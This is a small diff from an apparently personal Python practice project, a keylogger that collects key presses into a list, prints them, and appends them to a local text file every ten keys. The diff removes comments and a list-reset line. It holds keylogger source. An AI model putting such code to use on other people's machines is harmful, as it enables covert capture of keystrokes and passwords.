@@ -15,10 +15,9 @@ def press(key):
     keys.append(key)
     count += 1
     print(key)
-    if count >= 10: # set this for input key limit without pressing space.
+    if count >= 10:
         count = 0 
-        save(keys) # This part doesn't work for some reason.
-        keys = []
+        save(keys) 
 
 def save(keys):
     with open(r"C:\Users\Flores\Joey-vscode-workspaces\Python-Practice\.projects\.completed\keylogger\save.txt", "a") as file:
